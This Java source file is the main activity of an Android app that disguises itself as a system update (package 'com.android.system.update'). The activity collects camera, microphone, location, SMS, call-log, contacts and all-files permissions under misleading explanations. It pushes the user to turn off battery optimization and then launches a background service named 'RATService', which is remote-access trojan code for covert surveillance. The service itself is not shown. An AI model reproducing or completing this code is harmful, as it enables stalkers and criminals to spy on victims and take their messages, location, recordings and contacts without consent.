package com.android.system.update;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int BATTERY_OPTIMIZATION_REQUEST_CODE = 200;
    private static final int MANAGE_STORAGE_REQUEST_CODE = 300;
    
    // All permissions we need (following the working pattern)
    private final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    };
    
    // Critical permissions (must be granted for core functionality)
    private final String[] CRITICAL_PERMISSIONS = {
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
        
        Log.d(TAG, "Starting permission check");
        checkAndRequestPermissions();
    }
    
    private void checkAndRequestPermissions() {
        // First, check if we need MANAGE_EXTERNAL_STORAGE for Android 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                requestManageStoragePermission();
                return;
            }
        }
        
        // Check if we have critical permissions
        if (!hasCriticalPermissions()) {
            requestCriticalPermissions();
            return;
        }
        
        // Check if we have all permissions
        if (!hasAllPermissions()) {
            requestAllPermissions();
            return;
        }
        
        // All permissions granted, start service
        Log.d(TAG, "All permissions granted, starting service");
        allPermissionsGranted();
    }
    
    private boolean hasCriticalPermissions() {
        for (String permission : CRITICAL_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "Missing critical permission: " + permission);
                return false;
            }
        }
        return true;
    }
    
    private boolean hasAllPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "Missing permission: " + permission);
                return false;
            }
        }
        return true;
    }
    
    private void requestCriticalPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        
        for (String permission : CRITICAL_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        if (!permissionsToRequest.isEmpty()) {
            Log.d(TAG, "Requesting critical permissions: " + permissionsToRequest.size());
            
            // Show explanation dialog for critical permissions
            new AlertDialog.Builder(this)
                .setTitle("Critical Permissions Required")
                .setMessage("This app needs camera, microphone, and location permissions to function properly.\n\n" +
                           "• Camera: For taking photos and video streaming\n" +
                           "• Microphone: For audio recording\n" +
                           "• Location: For GPS tracking")
                .setPositiveButton("Grant Permissions", (dialog, which) -> {
                    ActivityCompat.requestPermissions(
                        this,
                        permissionsToRequest.toArray(new String[0]),
                        PERMISSION_REQUEST_CODE);
                })
                .setNegativeButton("Exit", (dialog, which) -> {
                    finish();
                })
                .setCancelable(false)
                .show();
        }
    }
    
    private void requestAllPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        if (!permissionsToRequest.isEmpty()) {
            Log.d(TAG, "Requesting all permissions: " + permissionsToRequest.size());
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toArray(new String[0]),
                PERMISSION_REQUEST_CODE);
        }
    }
    
    private void requestManageStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                new AlertDialog.Builder(this)
                    .setTitle("Storage Permission Required")
                    .setMessage("This app needs access to all files to browse folders.")
                    .setPositiveButton("Grant Access", (dialog, which) -> {
                        try {
                            Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                        } catch (Exception e) {
                            Intent intent = new Intent();
                            intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                            startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                        }
                    })
                    .setNegativeButton("Skip", (dialog, which) -> {
                        checkAndRequestPermissions();
                    })
                    .show();
            } catch (Exception e) {
                e.printStackTrace();
                checkAndRequestPermissions();
            }
        } else {
            checkAndRequestPermissions();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allCriticalGranted = true;
            StringBuilder deniedPermissions = new StringBuilder();
            
            for (int i = 0; i < permissions.length; i++) {
                boolean granted = grantResults[i] == PackageManager.PERMISSION_GRANTED;
                String permission = permissions[i];
                
                Log.d(TAG, permission + ": " + (granted ? "GRANTED" : "DENIED"));
                
                if (!granted) {
                    deniedPermissions.append(getPermissionDescription(permission)).append("\n");
                    
                    // Check if a critical permission was denied
                    for (String critical : CRITICAL_PERMISSIONS) {
                        if (critical.equals(permission)) {
                            allCriticalGranted = false;
                            break;
                        }
                    }
                }
            }
            
            if (!allCriticalGranted) {
                // Critical permissions denied, show error and exit
                new AlertDialog.Builder(this)
                    .setTitle("Critical Permissions Denied")
                    .setMessage("The following critical permissions were denied:\n" + 
                               deniedPermissions.toString() + 
                               "\n\nThe app cannot function without these permissions.")
                    .setPositiveButton("Exit", (dialog, which) -> {
                        finish();
                    })
                    .setCancelable(false)
                    .show();
                return;
            }
            
            if (deniedPermissions.length() > 0) {
                // Some non-critical permissions denied, show warning
                Toast.makeText(this, 
                    "Some permissions denied. Some features may not work:\n" + deniedPermissions.toString(), 
                    Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(this, "All permissions granted!", Toast.LENGTH_SHORT).show();
            }
            
            // Check if we need MANAGE_EXTERNAL_STORAGE
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (!Environment.isExternalStorageManager()) {
                    requestManageStoragePermission();
                    return;
                }
            }
            
            // Start the service
            allPermissionsGranted();
        }
    }
    
    private String getPermissionDescription(String permission) {
        switch (permission) {
            case Manifest.permission.CAMERA:
                return "• Camera (for photos and video streaming)";
            case Manifest.permission.RECORD_AUDIO:
                return "• Microphone (for audio recording and video audio)";
            case Manifest.permission.ACCESS_FINE_LOCATION:
            case Manifest.permission.ACCESS_COARSE_LOCATION:
                return "• Location (for GPS tracking)";
            case Manifest.permission.READ_SMS:
                return "• Read SMS";
            case Manifest.permission.SEND_SMS:
                return "• Send SMS";
            case Manifest.permission.RECEIVE_SMS:
                return "• Receive SMS";
            case Manifest.permission.READ_CALL_LOG:
                return "• Read Call Log";
            case Manifest.permission.READ_CONTACTS:
                return "• Read Contacts";
            case Manifest.permission.READ_PHONE_STATE:
                return "• Phone State";
            case Manifest.permission.READ_EXTERNAL_STORAGE:
            case Manifest.permission.WRITE_EXTERNAL_STORAGE:
                return "• Storage Access";
            default:
                return "• " + permission.substring(permission.lastIndexOf('.') + 1);
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == BATTERY_OPTIMIZATION_REQUEST_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Toast.makeText(this, "Battery optimization disabled", Toast.LENGTH_LONG).show();
                }
            }
        } else if (requestCode == MANAGE_STORAGE_REQUEST_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    Toast.makeText(this, "Storage access granted!", Toast.LENGTH_SHORT).show();
                }
            }
            checkAndRequestPermissions();
        }
    }
    
    private void allPermissionsGranted() {
        Log.d(TAG, "Starting service");
        startRATService();
        checkBatteryOptimization();
    }
    
    private void checkBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                new AlertDialog.Builder(this)
                    .setTitle("Battery Optimization")
                    .setMessage("Disable battery optimization for better background performance?")
                    .setPositiveButton("Disable", (dialog, which) -> {
                        requestIgnoreBatteryOptimizations();
                    })
                    .setNegativeButton("Later", null)
                    .show();
            }
        }
    }
    
    private void requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, BATTERY_OPTIMIZATION_REQUEST_CODE);
        }
    }
    
    private void startRATService() {
        Intent serviceIntent = new Intent(this, RATService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        Toast.makeText(this, "Service Started", Toast.LENGTH_SHORT).show();
        finish();
    }
}
